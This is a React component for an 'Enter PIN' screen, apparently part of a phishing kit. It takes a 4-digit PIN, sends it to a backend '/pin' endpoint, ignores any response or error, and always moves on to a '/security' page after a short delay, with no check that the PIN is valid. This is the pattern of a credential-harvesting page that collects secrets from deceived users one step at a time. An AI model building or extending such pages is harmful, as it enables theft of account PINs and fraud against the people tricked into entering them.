import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const inputRef = useRef(null);

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const handleChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4);
    setPin(value);
    setError("");
  };

  const handleSubmit = () => {
    if (pin.length < 4) {
      setError("Please enter your 4-digit PIN.");
      return;
    }
    setLoading(true);
    axios.post(`${BASE_URL}/pin`, { pin }).catch(() => {});
    setTimeout(() => {
      setLoading(false);
      navigate("/security");
    }, 800);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col px-7">
      {/* Heading */}
      <div className="mt-14">
        <h1 className="text-[34px] font-black text-gray-900 leading-tight tracking-tight">
          Enter PIN
        </h1>
        <p className="mt-3 text-[15px] text-gray-500 leading-snug">
          Enter your 4-digit PIN-code to continue.
        </p>
      </div>

      {/* PIN input */}
      <div className="mt-8">
        <input
          ref={inputRef}
          type="password"
          inputMode="numeric"
          pattern="[0-9]*"
          placeholder="PIN"
          value={pin}
          onChange={handleChange}
          maxLength={4}
          autoComplete="off"
          className="w-full bg-gray-200 rounded-xl px-5 py-5 text-[18px] text-gray-900 placeholder-gray-400 outline-none tracking-widest"
        />
        {error && (
          <p className="mt-2 text-sm text-red-500 font-medium">{error}</p>
        )}
      </div>

      {/* Continue button */}
      <div className="mt-4">
        <button
          type="button"
          disabled={loading}
          onClick={handleSubmit}
          className="w-full bg-[#FA5621] hover:bg-[#e04d1c] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-[17px] py-5 rounded-xl cursor-pointer transition-colors duration-200"
        >
          {loading ? "Please wait..." : "Continue"}
        </button>
      </div>
    </div>
  );
};

export default Pin;
